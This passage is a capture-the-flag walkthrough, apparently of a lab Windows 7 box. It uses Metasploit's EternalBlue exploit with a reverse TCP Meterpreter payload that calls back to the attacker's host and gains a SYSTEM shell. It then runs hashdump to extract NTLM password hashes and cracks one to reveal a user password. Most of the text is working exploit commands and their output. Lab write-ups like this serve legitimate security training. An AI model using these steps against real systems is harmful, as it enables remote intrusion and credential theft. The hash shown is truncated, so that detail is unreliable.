+   55  payload/windows/x64/vncinject/reverse_tcp_rc4                        normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   56  payload/windows/x64/vncinject/reverse_tcp_uuid                       normal  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
+   57  payload/windows/x64/vncinject/reverse_winhttp                        normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
+   58  payload/windows/x64/vncinject/reverse_winhttps                       normal  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+We type in exit to get back to our MSF shell.
+We type in show payloads to locate a suitable tcp merterpreter shell.
+As per the output above I will use #16 payload/windows/x64/meterpreter/reverse_tcp  
+
+I enter the command
+set payload 16 
+I configure the payload as we did aboive with the windows_reverse_tcp shell using the lhosts, rhosts, set payload and then I use run to execute the shell.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.4.65.102:4444 
+[*] 10.10.98.55:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.10.98.55:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.98.55:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 10.10.98.55:445 - The target is vulnerable.
+[*] 10.10.98.55:445 - Connecting to target for exploitation.
+[+] 10.10.98.55:445 - Connection established for exploitation.
+[+] 10.10.98.55:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.98.55:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.98.55:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.98.55:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.98.55:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.98.55:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.98.55:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.98.55:445 - Sending all but last fragment of exploit packet
+[*] 10.10.98.55:445 - Starting non-paged pool grooming
+[+] 10.10.98.55:445 - Sending SMBv2 buffers
+[+] 10.10.98.55:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.98.55:445 - Sending final SMBv2 buffers.
+[*] 10.10.98.55:445 - Sending last fragment of exploit packet!
+[*] 10.10.98.55:445 - Receiving response from exploit packet
+[+] 10.10.98.55:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.98.55:445 - Sending egg to corrupted connection.
+[*] 10.10.98.55:445 - Triggering free of corrupted buffer.
+[*] Sending stage (200262 bytes) to 10.10.98.55
+[*] Meterpreter session 1 opened (10.4.65.102:4444 -> 10.10.98.55:49174 ) at 2022-04-10 03:37:52 -0400
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.98.55:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > 
+Background session 1? [y/N]  
+msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.4.65.102:4444 -> 10.10.98.55:49174  (10.10.9
+                                                                   8.55)
+
+msf6 post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to a
+                                       uto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
+SESSION => 1
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session type: meterpreter
+[*] Upgrading session ID: 1
+[-] Meterpreter sessions cannot be upgraded any higher
+[*] Post module execution completed
+msf6 post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.4.65.102:4444 -> 10.10.98.55:49174  (10.10.9
+                                                                   8.55)
+
+msf6 post(multi/manage/shell_to_meterpreter) > 
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                   Connection
+  --  ----  ----                     -----------                   ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.4.65.102:4444 -> 10.10.98.55:49174  (10.10.9
+                                                                   8.55)
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8a
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+After we establish the reverse_merterpreter shell with the host, we attempt to get root access; in this case it isn't actually needed as we already have root.
+To finish the box off I type hashdump to get all of the cracked passwords hashes.
+I copy `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8a` and paste `ffb43f0de35be4d9917ac0cc8a` into crackstation to identify Jons password as alqfna22 
